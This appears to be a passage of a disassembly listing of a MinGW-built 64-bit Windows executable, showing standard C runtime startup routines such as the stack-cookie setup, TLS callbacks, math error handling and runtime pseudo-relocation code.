  4016b0:	ff 15 36 7d 00 00    	call   *0x7d36(%rip)        # 4093ec <__imp_GetTickCount>
  4016b6:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  4016bb:	41 89 c4             	mov    %eax,%r12d
  4016be:	ff 15 48 7d 00 00    	call   *0x7d48(%rip)        # 40940c <__imp_QueryPerformanceCounter>
  4016c4:	48 33 74 24 28       	xor    0x28(%rsp),%rsi
  4016c9:	89 e8                	mov    %ebp,%eax
  4016cb:	48 ba ff ff ff ff ff 	movabs $0xffffffffffff,%rdx
  4016d2:	ff 00 00 
  4016d5:	48 31 f0             	xor    %rsi,%rax
  4016d8:	89 fe                	mov    %edi,%esi
  4016da:	48 31 c6             	xor    %rax,%rsi
  4016dd:	44 89 e0             	mov    %r12d,%eax
  4016e0:	48 31 f0             	xor    %rsi,%rax
  4016e3:	48 21 d0             	and    %rdx,%rax
  4016e6:	48 39 d8             	cmp    %rbx,%rax
  4016e9:	74 25                	je     401710 <__security_init_cookie+0xc0>
  4016eb:	48 89 c2             	mov    %rax,%rdx
  4016ee:	48 f7 d2             	not    %rdx
  4016f1:	48 89 05 18 2a 00 00 	mov    %rax,0x2a18(%rip)        # 404110 <__security_cookie>
  4016f8:	48 89 15 21 2a 00 00 	mov    %rdx,0x2a21(%rip)        # 404120 <__security_cookie_complement>
  4016ff:	48 83 c4 30          	add    $0x30,%rsp
  401703:	5b                   	pop    %rbx
  401704:	5e                   	pop    %rsi
  401705:	5f                   	pop    %rdi
  401706:	5d                   	pop    %rbp
  401707:	41 5c                	pop    %r12
  401709:	c3                   	ret
  40170a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401710:	48 ba cc 5d 20 d2 66 	movabs $0xffffd466d2205dcc,%rdx
  401717:	d4 ff ff 
  40171a:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
  401721:	2b 00 00 
  401724:	eb cb                	jmp    4016f1 <__security_init_cookie+0xa1>
  401726:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40172d:	00 00 00 

0000000000401730 <__report_gsfailure>:
  401730:	55                   	push   %rbp
  401731:	56                   	push   %rsi
  401732:	53                   	push   %rbx
  401733:	48 89 e5             	mov    %rsp,%rbp
  401736:	48 83 ec 70          	sub    $0x70,%rsp
  40173a:	48 89 cb             	mov    %rcx,%rbx
  40173d:	48 8d 0d 1c 69 00 00 	lea    0x691c(%rip),%rcx        # 408060 <mingw_initcharmax+0x10>
  401744:	ff 15 d2 7c 00 00    	call   *0x7cd2(%rip)        # 40941c <__imp_RtlCaptureContext>
  40174a:	48 8b 35 07 6a 00 00 	mov    0x6a07(%rip),%rsi        # 408158 <mingw_initcharmax+0x108>
  401751:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
  401755:	45 31 c0             	xor    %r8d,%r8d
  401758:	48 89 f1             	mov    %rsi,%rcx
  40175b:	ff 15 c3 7c 00 00    	call   *0x7cc3(%rip)        # 409424 <__imp_RtlLookupFunctionEntry>
  401761:	49 89 c1             	mov    %rax,%r9
  401764:	48 85 c0             	test   %rax,%rax
  401767:	0f 84 a0 00 00 00    	je     40180d <__report_gsfailure+0xdd>
  40176d:	48 8d 45 e0          	lea    -0x20(%rbp),%rax
  401771:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  401775:	49 89 f0             	mov    %rsi,%r8
  401778:	31 c9                	xor    %ecx,%ecx
  40177a:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  40177f:	48 8d 45 e8          	lea    -0x18(%rbp),%rax
  401783:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  401788:	48 8d 05 d1 68 00 00 	lea    0x68d1(%rip),%rax        # 408060 <mingw_initcharmax+0x10>
  40178f:	48 c7 44 24 38 00 00 	movq   $0x0,0x38(%rsp)
  401796:	00 00 
  401798:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  40179d:	ff 15 89 7c 00 00    	call   *0x7c89(%rip)        # 40942c <__imp_RtlVirtualUnwind>
  4017a3:	48 8b 05 ae 69 00 00 	mov    0x69ae(%rip),%rax        # 408158 <mingw_initcharmax+0x108>
  4017aa:	31 c9                	xor    %ecx,%ecx
  4017ac:	48 89 1d 2d 69 00 00 	mov    %rbx,0x692d(%rip)        # 4080e0 <mingw_initcharmax+0x90>
  4017b3:	48 89 05 96 6d 00 00 	mov    %rax,0x6d96(%rip)        # 408550 <mingw_initcharmax+0x500>
  4017ba:	48 b8 09 04 00 c0 01 	movabs $0x1c0000409,%rax
  4017c1:	00 00 00 
  4017c4:	48 89 05 75 6d 00 00 	mov    %rax,0x6d75(%rip)        # 408540 <mingw_initcharmax+0x4f0>
  4017cb:	48 8b 05 3e 29 00 00 	mov    0x293e(%rip),%rax        # 404110 <__security_cookie>
  4017d2:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  4017d6:	48 8b 05 43 29 00 00 	mov    0x2943(%rip),%rax        # 404120 <__security_cookie_complement>
  4017dd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  4017e1:	ff 15 55 7c 00 00    	call   *0x7c55(%rip)        # 40943c <__imp_SetUnhandledExceptionFilter>
  4017e7:	48 8d 0d a2 38 00 00 	lea    0x38a2(%rip),%rcx        # 405090 <__data_end__+0xf60>
  4017ee:	ff 15 68 7c 00 00    	call   *0x7c68(%rip)        # 40945c <__imp_UnhandledExceptionFilter>
  4017f4:	ff 15 ba 7b 00 00    	call   *0x7bba(%rip)        # 4093b4 <__imp_GetCurrentProcess>
  4017fa:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
  4017ff:	48 89 c1             	mov    %rax,%rcx
  401802:	ff 15 44 7c 00 00    	call   *0x7c44(%rip)        # 40944c <__imp_TerminateProcess>
  401808:	e8 db 19 00 00       	call   4031e8 <abort>
  40180d:	48 8b 45 18          	mov    0x18(%rbp),%rax
  401811:	48 89 05 40 69 00 00 	mov    %rax,0x6940(%rip)        # 408158 <mingw_initcharmax+0x108>
  401818:	48 8d 45 08          	lea    0x8(%rbp),%rax
  40181c:	48 89 05 d5 68 00 00 	mov    %rax,0x68d5(%rip)        # 4080f8 <mingw_initcharmax+0xa8>
  401823:	e9 7b ff ff ff       	jmp    4017a3 <__report_gsfailure+0x73>
  401828:	90                   	nop
  401829:	90                   	nop
  40182a:	90                   	nop
  40182b:	90                   	nop
  40182c:	90                   	nop
  40182d:	90                   	nop
  40182e:	90                   	nop
  40182f:	90                   	nop
  401830:	48 83 ec 28          	sub    $0x28,%rsp
  401834:	83 fa 03             	cmp    $0x3,%edx
  401837:	74 17                	je     401850 <__report_gsfailure+0x120>
  401839:	85 d2                	test   %edx,%edx
  40183b:	74 13                	je     401850 <__report_gsfailure+0x120>
  40183d:	b8 01 00 00 00       	mov    $0x1,%eax
  401842:	48 83 c4 28          	add    $0x28,%rsp
  401846:	c3                   	ret
  401847:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40184e:	00 00 
  401850:	e8 7b 0d 00 00       	call   4025d0 <__mingw_TLScallback>
  401855:	b8 01 00 00 00       	mov    $0x1,%eax
  40185a:	48 83 c4 28          	add    $0x28,%rsp
  40185e:	c3                   	ret
  40185f:	90                   	nop

0000000000401860 <__dyn_tls_init>:
  401860:	56                   	push   %rsi
  401861:	53                   	push   %rbx
  401862:	48 83 ec 28          	sub    $0x28,%rsp
  401866:	48 8b 05 73 3b 00 00 	mov    0x3b73(%rip),%rax        # 4053e0 <.refptr._CRT_MT>
  40186d:	83 38 02             	cmpl   $0x2,(%rax)
  401870:	74 06                	je     401878 <__dyn_tls_init+0x18>
  401872:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
  401878:	83 fa 02             	cmp    $0x2,%edx
  40187b:	74 13                	je     401890 <__dyn_tls_init+0x30>
  40187d:	83 fa 01             	cmp    $0x1,%edx
  401880:	74 4e                	je     4018d0 <__dyn_tls_init+0x70>
  401882:	b8 01 00 00 00       	mov    $0x1,%eax
  401887:	48 83 c4 28          	add    $0x28,%rsp
  40188b:	5b                   	pop    %rbx
  40188c:	5e                   	pop    %rsi
  40188d:	c3                   	ret
  40188e:	66 90                	xchg   %ax,%ax
  401890:	48 8d 1d c9 87 00 00 	lea    0x87c9(%rip),%rbx        # 40a060 <___crt_xp_end__+0x8>
  401897:	48 8d 35 c2 87 00 00 	lea    0x87c2(%rip),%rsi        # 40a060 <___crt_xp_end__+0x8>
  40189e:	48 39 de             	cmp    %rbx,%rsi
  4018a1:	74 df                	je     401882 <__dyn_tls_init+0x22>
  4018a3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4018a8:	48 8b 03             	mov    (%rbx),%rax
  4018ab:	48 85 c0             	test   %rax,%rax
  4018ae:	74 02                	je     4018b2 <__dyn_tls_init+0x52>
  4018b0:	ff d0                	call   *%rax
  4018b2:	48 83 c3 08          	add    $0x8,%rbx
  4018b6:	48 39 de             	cmp    %rbx,%rsi
  4018b9:	75 ed                	jne    4018a8 <__dyn_tls_init+0x48>
  4018bb:	b8 01 00 00 00       	mov    $0x1,%eax
  4018c0:	48 83 c4 28          	add    $0x28,%rsp
  4018c4:	5b                   	pop    %rbx
  4018c5:	5e                   	pop    %rsi
  4018c6:	c3                   	ret
  4018c7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4018ce:	00 00 
  4018d0:	e8 fb 0c 00 00       	call   4025d0 <__mingw_TLScallback>
  4018d5:	b8 01 00 00 00       	mov    $0x1,%eax
  4018da:	48 83 c4 28          	add    $0x28,%rsp
  4018de:	5b                   	pop    %rbx
  4018df:	5e                   	pop    %rsi
  4018e0:	c3                   	ret
  4018e1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  4018e8:	00 00 00 00 
  4018ec:	0f 1f 40 00          	nopl   0x0(%rax)

00000000004018f0 <__tlregdtor>:
  4018f0:	31 c0                	xor    %eax,%eax
  4018f2:	c3                   	ret
  4018f3:	90                   	nop
  4018f4:	90                   	nop
  4018f5:	90                   	nop
  4018f6:	90                   	nop
  4018f7:	90                   	nop
  4018f8:	90                   	nop
  4018f9:	90                   	nop
  4018fa:	90                   	nop
  4018fb:	90                   	nop
  4018fc:	90                   	nop
  4018fd:	90                   	nop
  4018fe:	90                   	nop
  4018ff:	90                   	nop

0000000000401900 <_matherr>:
  401900:	56                   	push   %rsi
  401901:	53                   	push   %rbx
  401902:	48 83 ec 78          	sub    $0x78,%rsp
  401906:	0f 11 74 24 40       	movups %xmm6,0x40(%rsp)
  40190b:	0f 11 7c 24 50       	movups %xmm7,0x50(%rsp)
  401910:	44 0f 11 44 24 60    	movups %xmm8,0x60(%rsp)
  401916:	83 39 06             	cmpl   $0x6,(%rcx)
  401919:	0f 87 cd 00 00 00    	ja     4019ec <_matherr+0xec>
  40191f:	8b 01                	mov    (%rcx),%eax
  401921:	48 8d 15 fc 38 00 00 	lea    0x38fc(%rip),%rdx        # 405224 <_tls_used+0x164>
  401928:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  40192c:	48 01 d0             	add    %rdx,%rax
  40192f:	ff e0                	jmp    *%rax
  401931:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  401938:	48 8d 1d 97 38 00 00 	lea    0x3897(%rip),%rbx        # 4051d6 <_tls_used+0x116>
  40193f:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
  401945:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
  40194a:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
  40194f:	48 8b 71 08          	mov    0x8(%rcx),%rsi
  401953:	b9 02 00 00 00       	mov    $0x2,%ecx
  401958:	e8 f3 17 00 00       	call   403150 <__acrt_iob_func>
  40195d:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
  401964:	49 89 d8             	mov    %rbx,%r8
  401967:	48 8d 15 8a 38 00 00 	lea    0x388a(%rip),%rdx        # 4051f8 <_tls_used+0x138>
  40196e:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
  401974:	48 89 c1             	mov    %rax,%rcx
  401977:	49 89 f1             	mov    %rsi,%r9
  40197a:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
  401980:	e8 6b 15 00 00       	call   402ef0 <fprintf>
  401985:	90                   	nop
  401986:	0f 10 74 24 40       	movups 0x40(%rsp),%xmm6
  40198b:	0f 10 7c 24 50       	movups 0x50(%rsp),%xmm7
  401990:	31 c0                	xor    %eax,%eax
  401992:	44 0f 10 44 24 60    	movups 0x60(%rsp),%xmm8
  401998:	48 83 c4 78          	add    $0x78,%rsp
  40199c:	5b                   	pop    %rbx
  40199d:	5e                   	pop    %rsi
  40199e:	c3                   	ret
  40199f:	90                   	nop
  4019a0:	48 8d 1d 69 37 00 00 	lea    0x3769(%rip),%rbx        # 405110 <_tls_used+0x50>
  4019a7:	eb 96                	jmp    40193f <_matherr+0x3f>
  4019a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4019b0:	48 8d 1d 99 37 00 00 	lea    0x3799(%rip),%rbx        # 405150 <_tls_used+0x90>
  4019b7:	eb 86                	jmp    40193f <_matherr+0x3f>
  4019b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4019c0:	48 8d 1d 69 37 00 00 	lea    0x3769(%rip),%rbx        # 405130 <_tls_used+0x70>
  4019c7:	e9 73 ff ff ff       	jmp    40193f <_matherr+0x3f>
  4019cc:	0f 1f 40 00          	nopl   0x0(%rax)
  4019d0:	48 8d 1d c9 37 00 00 	lea    0x37c9(%rip),%rbx        # 4051a0 <_tls_used+0xe0>
  4019d7:	e9 63 ff ff ff       	jmp    40193f <_matherr+0x3f>
  4019dc:	0f 1f 40 00          	nopl   0x0(%rax)
  4019e0:	48 8d 1d 91 37 00 00 	lea    0x3791(%rip),%rbx        # 405178 <_tls_used+0xb8>
  4019e7:	e9 53 ff ff ff       	jmp    40193f <_matherr+0x3f>
  4019ec:	48 8d 1d 0d 37 00 00 	lea    0x370d(%rip),%rbx        # 405100 <_tls_used+0x40>
  4019f3:	e9 47 ff ff ff       	jmp    40193f <_matherr+0x3f>
  4019f8:	90                   	nop
  4019f9:	90                   	nop
  4019fa:	90                   	nop
  4019fb:	90                   	nop
  4019fc:	90                   	nop
  4019fd:	90                   	nop
  4019fe:	90                   	nop
  4019ff:	90                   	nop

0000000000401a00 <_fpreset>:
  401a00:	db e3                	fninit
  401a02:	c3                   	ret
  401a03:	90                   	nop
  401a04:	90                   	nop
  401a05:	90                   	nop
  401a06:	90                   	nop
  401a07:	90                   	nop
  401a08:	90                   	nop
  401a09:	90                   	nop
  401a0a:	90                   	nop
  401a0b:	90                   	nop
  401a0c:	90                   	nop
  401a0d:	90                   	nop
  401a0e:	90                   	nop
  401a0f:	90                   	nop
  401a10:	41 54                	push   %r12
  401a12:	53                   	push   %rbx
  401a13:	48 83 ec 38          	sub    $0x38,%rsp
  401a17:	49 89 cc             	mov    %rcx,%r12
  401a1a:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
  401a1f:	b9 02 00 00 00       	mov    $0x2,%ecx
  401a24:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
  401a29:	4c 89 44 24 60       	mov    %r8,0x60(%rsp)
  401a2e:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
  401a33:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  401a38:	e8 13 17 00 00       	call   403150 <__acrt_iob_func>
  401a3d:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
  401a43:	ba 01 00 00 00       	mov    $0x1,%edx
  401a48:	48 8d 0d f1 37 00 00 	lea    0x37f1(%rip),%rcx        # 405240 <_tls_used+0x180>
  401a4f:	49 89 c1             	mov    %rax,%r9
  401a52:	e8 21 17 00 00       	call   403178 <fwrite>
  401a57:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
  401a5c:	b9 02 00 00 00       	mov    $0x2,%ecx
  401a61:	e8 ea 16 00 00       	call   403150 <__acrt_iob_func>
  401a66:	4c 89 e2             	mov    %r12,%rdx
  401a69:	48 89 c1             	mov    %rax,%rcx
  401a6c:	49 89 d8             	mov    %rbx,%r8
  401a6f:	e8 1c 14 00 00       	call   402e90 <vfprintf>
  401a74:	e8 6f 17 00 00       	call   4031e8 <abort>
  401a79:	90                   	nop
  401a7a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401a80:	41 54                	push   %r12
  401a82:	55                   	push   %rbp
  401a83:	57                   	push   %rdi
  401a84:	56                   	push   %rsi
  401a85:	53                   	push   %rbx
  401a86:	48 83 ec 50          	sub    $0x50,%rsp
  401a8a:	48 63 3d 83 6b 00 00 	movslq 0x6b83(%rip),%rdi        # 408614 <mingw_app_type+0x14>
  401a91:	49 89 cc             	mov    %rcx,%r12
  401a94:	48 89 d6             	mov    %rdx,%rsi
  401a97:	4c 89 c3             	mov    %r8,%rbx
  401a9a:	85 ff                	test   %edi,%edi
  401a9c:	0f 8e 86 01 00 00    	jle    401c28 <_fpreset+0x228>
  401aa2:	48 8b 05 6f 6b 00 00 	mov    0x6b6f(%rip),%rax        # 408618 <mingw_app_type+0x18>
  401aa9:	31 c9                	xor    %ecx,%ecx
  401aab:	48 83 c0 18          	add    $0x18,%rax
  401aaf:	90                   	nop
  401ab0:	48 8b 10             	mov    (%rax),%rdx
  401ab3:	49 39 d4             	cmp    %rdx,%r12
  401ab6:	72 14                	jb     401acc <_fpreset+0xcc>
  401ab8:	4c 8b 40 08          	mov    0x8(%rax),%r8
  401abc:	45 8b 40 08          	mov    0x8(%r8),%r8d
  401ac0:	4c 01 c2             	add    %r8,%rdx
  401ac3:	49 39 d4             	cmp    %rdx,%r12
  401ac6:	0f 82 8b 00 00 00    	jb     401b57 <_fpreset+0x157>
  401acc:	83 c1 01             	add    $0x1,%ecx
  401acf:	48 83 c0 28          	add    $0x28,%rax
  401ad3:	39 f9                	cmp    %edi,%ecx
  401ad5:	75 d9                	jne    401ab0 <_fpreset+0xb0>
  401ad7:	4c 89 e1             	mov    %r12,%rcx
  401ada:	e8 01 0d 00 00       	call   4027e0 <__mingw_GetSectionForAddress>
  401adf:	48 89 c5             	mov    %rax,%rbp
  401ae2:	48 85 c0             	test   %rax,%rax
  401ae5:	0f 84 77 01 00 00    	je     401c62 <_fpreset+0x262>
  401aeb:	48 8b 05 26 6b 00 00 	mov    0x6b26(%rip),%rax        # 408618 <mingw_app_type+0x18>
  401af2:	48 8d 3c bf          	lea    (%rdi,%rdi,4),%rdi
  401af6:	48 c1 e7 03          	shl    $0x3,%rdi
  401afa:	48 01 f8             	add    %rdi,%rax
  401afd:	48 89 68 20          	mov    %rbp,0x20(%rax)
  401b01:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
  401b07:	e8 04 0e 00 00       	call   402910 <_GetPEImageBase>
  401b0c:	8b 4d 0c             	mov    0xc(%rbp),%ecx
  401b0f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
  401b14:	41 b8 30 00 00 00    	mov    $0x30,%r8d
  401b1a:	48 01 c1             	add    %rax,%rcx
  401b1d:	48 8b 05 f4 6a 00 00 	mov    0x6af4(%rip),%rax        # 408618 <mingw_app_type+0x18>
  401b24:	48 89 4c 38 18       	mov    %rcx,0x18(%rax,%rdi,1)
  401b29:	ff 15 4d 79 00 00    	call   *0x794d(%rip)        # 40947c <__imp_VirtualQuery>
  401b2f:	48 85 c0             	test   %rax,%rax
  401b32:	0f 84 39 01 00 00    	je     401c71 <_fpreset+0x271>
  401b38:	8b 44 24 44          	mov    0x44(%rsp),%eax
  401b3c:	8d 50 c0             	lea    -0x40(%rax),%edx
  401b3f:	83 e2 bf             	and    $0xffffffbf,%edx
  401b42:	74 0c                	je     401b50 <_fpreset+0x150>
  401b44:	83 e8 04             	sub    $0x4,%eax
  401b47:	83 e0 fb             	and    $0xfffffffb,%eax
  401b4a:	0f 85 90 00 00 00    	jne    401be0 <_fpreset+0x1e0>
  401b50:	83 05 bd 6a 00 00 01 	addl   $0x1,0x6abd(%rip)        # 408614 <mingw_app_type+0x14>
  401b57:	83 fb 08             	cmp    $0x8,%ebx
  401b5a:	73 2c                	jae    401b88 <_fpreset+0x188>
  401b5c:	f6 c3 04             	test   $0x4,%bl
  401b5f:	0f 85 cb 00 00 00    	jne    401c30 <_fpreset+0x230>
  401b65:	85 db                	test   %ebx,%ebx
  401b67:	74 10                	je     401b79 <_fpreset+0x179>
  401b69:	0f b6 06             	movzbl (%rsi),%eax
  401b6c:	41 88 04 24          	mov    %al,(%r12)
  401b70:	f6 c3 02             	test   $0x2,%bl
  401b73:	0f 85 d7 00 00 00    	jne    401c50 <_fpreset+0x250>
  401b79:	48 83 c4 50          	add    $0x50,%rsp
  401b7d:	5b                   	pop    %rbx
  401b7e:	5e                   	pop    %rsi
  401b7f:	5f                   	pop    %rdi
  401b80:	5d                   	pop    %rbp
  401b81:	41 5c                	pop    %r12
  401b83:	c3                   	ret
  401b84:	0f 1f 40 00          	nopl   0x0(%rax)
  401b88:	48 8b 06             	mov    (%rsi),%rax
  401b8b:	49 8d 4c 24 08       	lea    0x8(%r12),%rcx
  401b90:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
  401b94:	49 89 04 24          	mov    %rax,(%r12)
  401b98:	89 d8                	mov    %ebx,%eax
  401b9a:	48 8b 54 06 f8       	mov    -0x8(%rsi,%rax,1),%rdx
  401b9f:	49 89 54 04 f8       	mov    %rdx,-0x8(%r12,%rax,1)
  401ba4:	49 29 cc             	sub    %rcx,%r12
  401ba7:	44 01 e3             	add    %r12d,%ebx
  401baa:	4c 29 e6             	sub    %r12,%rsi
  401bad:	83 e3 f8             	and    $0xfffffff8,%ebx
  401bb0:	83 fb 08             	cmp    $0x8,%ebx
  401bb3:	72 c4                	jb     401b79 <_fpreset+0x179>
  401bb5:	83 e3 f8             	and    $0xfffffff8,%ebx
  401bb8:	31 c0                	xor    %eax,%eax
  401bba:	89 c2                	mov    %eax,%edx
  401bbc:	83 c0 08             	add    $0x8,%eax
  401bbf:	4c 8b 04 16          	mov    (%rsi,%rdx,1),%r8
  401bc3:	4c 89 04 11          	mov    %r8,(%rcx,%rdx,1)
  401bc7:	39 d8                	cmp    %ebx,%eax
  401bc9:	72 ef                	jb     401bba <_fpreset+0x1ba>
  401bcb:	48 83 c4 50          	add    $0x50,%rsp
  401bcf:	5b                   	pop    %rbx
  401bd0:	5e                   	pop    %rsi
  401bd1:	5f                   	pop    %rdi
  401bd2:	5d                   	pop    %rbp
  401bd3:	41 5c                	pop    %r12
  401bd5:	c3                   	ret
  401bd6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401bdd:	00 00 00 
  401be0:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
  401be5:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
  401bea:	41 b8 40 00 00 00    	mov    $0x40,%r8d
  401bf0:	48 03 3d 21 6a 00 00 	add    0x6a21(%rip),%rdi        # 408618 <mingw_app_type+0x18>
  401bf7:	48 89 4f 08          	mov    %rcx,0x8(%rdi)
  401bfb:	49 89 f9             	mov    %rdi,%r9
  401bfe:	48 89 57 10          	mov    %rdx,0x10(%rdi)
  401c02:	ff 15 6c 78 00 00    	call   *0x786c(%rip)        # 409474 <__imp_VirtualProtect>
  401c08:	85 c0                	test   %eax,%eax
  401c0a:	0f 85 40 ff ff ff    	jne    401b50 <_fpreset+0x150>
  401c10:	ff 15 b6 77 00 00    	call   *0x77b6(%rip)        # 4093cc <__imp_GetLastError>
  401c16:	48 8d 0d 9b 36 00 00 	lea    0x369b(%rip),%rcx        # 4052b8 <_tls_used+0x1f8>
  401c1d:	89 c2                	mov    %eax,%edx
  401c1f:	e8 ec fd ff ff       	call   401a10 <_fpreset+0x10>
  401c24:	0f 1f 40 00          	nopl   0x0(%rax)
  401c28:	31 ff                	xor    %edi,%edi
  401c2a:	e9 a8 fe ff ff       	jmp    401ad7 <_fpreset+0xd7>
  401c2f:	90                   	nop
  401c30:	8b 06                	mov    (%rsi),%eax
  401c32:	89 db                	mov    %ebx,%ebx
  401c34:	41 89 04 24          	mov    %eax,(%r12)
  401c38:	8b 44 1e fc          	mov    -0x4(%rsi,%rbx,1),%eax
  401c3c:	41 89 44 1c fc       	mov    %eax,-0x4(%r12,%rbx,1)
  401c41:	e9 33 ff ff ff       	jmp    401b79 <_fpreset+0x179>
  401c46:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401c4d:	00 00 00 
  401c50:	89 db                	mov    %ebx,%ebx
  401c52:	0f b7 44 1e fe       	movzwl -0x2(%rsi,%rbx,1),%eax
  401c57:	66 41 89 44 1c fe    	mov    %ax,-0x2(%r12,%rbx,1)
  401c5d:	e9 17 ff ff ff       	jmp    401b79 <_fpreset+0x179>
  401c62:	4c 89 e2             	mov    %r12,%rdx
  401c65:	48 8d 0d f4 35 00 00 	lea    0x35f4(%rip),%rcx        # 405260 <_tls_used+0x1a0>
  401c6c:	e8 9f fd ff ff       	call   401a10 <_fpreset+0x10>
  401c71:	48 8b 05 a0 69 00 00 	mov    0x69a0(%rip),%rax        # 408618 <mingw_app_type+0x18>
  401c78:	8b 55 08             	mov    0x8(%rbp),%edx
  401c7b:	48 8d 0d fe 35 00 00 	lea    0x35fe(%rip),%rcx        # 405280 <_tls_used+0x1c0>
  401c82:	4c 8b 44 38 18       	mov    0x18(%rax,%rdi,1),%r8
  401c87:	e8 84 fd ff ff       	call   401a10 <_fpreset+0x10>
  401c8c:	90                   	nop
  401c8d:	0f 1f 00             	nopl   (%rax)

0000000000401c90 <_pei386_runtime_relocator>:
  401c90:	55                   	push   %rbp
  401c91:	41 57                	push   %r15
  401c93:	41 56                	push   %r14
  401c95:	41 55                	push   %r13
  401c97:	41 54                	push   %r12
  401c99:	57                   	push   %rdi
  401c9a:	56                   	push   %rsi
  401c9b:	53                   	push   %rbx
  401c9c:	48 83 ec 38          	sub    $0x38,%rsp
  401ca0:	48 8d ac 24 80 00 00 	lea    0x80(%rsp),%rbp
  401ca7:	00 
  401ca8:	8b 35 62 69 00 00    	mov    0x6962(%rip),%esi        # 408610 <mingw_app_type+0x10>
  401cae:	85 f6                	test   %esi,%esi
  401cb0:	74 16                	je     401cc8 <_pei386_runtime_relocator+0x38>
  401cb2:	48 8d 65 b8          	lea    -0x48(%rbp),%rsp
  401cb6:	5b                   	pop    %rbx
  401cb7:	5e                   	pop    %rsi
  401cb8:	5f                   	pop    %rdi
  401cb9:	41 5c                	pop    %r12
  401cbb:	41 5d                	pop    %r13
  401cbd:	41 5e                	pop    %r14
  401cbf:	41 5f                	pop    %r15
  401cc1:	5d                   	pop    %rbp
  401cc2:	c3                   	ret
  401cc3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  401cc8:	c7 05 3e 69 00 00 01 	movl   $0x1,0x693e(%rip)        # 408610 <mingw_app_type+0x10>
  401ccf:	00 00 00 
  401cd2:	e8 99 0b 00 00       	call   402870 <__mingw_GetSectionCount>
  401cd7:	48 98                	cltq
  401cd9:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
  401cdd:	48 8d 04 c5 0f 00 00 	lea    0xf(,%rax,8),%rax
  401ce4:	00 
  401ce5:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  401ce9:	e8 a2 0d 00 00       	call   402a90 <___chkstk_ms>
  401cee:	4c 8b 25 1b 37 00 00 	mov    0x371b(%rip),%r12        # 405410 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST_END__>
  401cf5:	48 8b 1d 24 37 00 00 	mov    0x3724(%rip),%rbx        # 405420 <.refptr.__RUNTIME_PSEUDO_RELOC_LIST__>
  401cfc:	c7 05 0e 69 00 00 00 	movl   $0x0,0x690e(%rip)        # 408614 <mingw_app_type+0x14>
  401d03:	00 00 00 
  401d06:	48 29 c4             	sub    %rax,%rsp
  401d09:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
  401d0e:	48 89 05 03 69 00 00 	mov    %rax,0x6903(%rip)        # 408618 <mingw_app_type+0x18>
  401d15:	4c 89 e0             	mov    %r12,%rax
  401d18:	48 29 d8             	sub    %rbx,%rax
  401d1b:	48 83 f8 07          	cmp    $0x7,%rax
  401d1f:	7e 91                	jle    401cb2 <_pei386_runtime_relocator+0x22>
  401d21:	8b 13                	mov    (%rbx),%edx
  401d23:	48 83 f8 0b          	cmp    $0xb,%rax
  401d27:	0f 8f 4b 01 00 00    	jg     401e78 <_pei386_runtime_relocator+0x1e8>
  401d2d:	85 d2                	test   %edx,%edx
  401d2f:	0f 85 cb 01 00 00    	jne    401f00 <_pei386_runtime_relocator+0x270>
  401d35:	8b 43 04             	mov    0x4(%rbx),%eax
  401d38:	85 c0                	test   %eax,%eax
  401d3a:	0f 85 c0 01 00 00    	jne    401f00 <_pei386_runtime_relocator+0x270>
  401d40:	8b 53 08             	mov    0x8(%rbx),%edx
  401d43:	83 fa 01             	cmp    $0x1,%edx
  401d46:	0f 85 1c 02 00 00    	jne    401f68 <_pei386_runtime_relocator+0x2d8>
  401d4c:	48 83 c3 0c          	add    $0xc,%rbx
  401d50:	4c 8d 7d a8          	lea    -0x58(%rbp),%r15
  401d54:	4c 8b 2d e5 36 00 00 	mov    0x36e5(%rip),%r13        # 405440 <.refptr.__image_base__>
  401d5b:	49 be 00 00 00 00 ff 	movabs $0xffffffff00000000,%r14
  401d62:	ff ff ff 
  401d65:	4c 39 e3             	cmp    %r12,%rbx
  401d68:	72 3f                	jb     401da9 <_pei386_runtime_relocator+0x119>
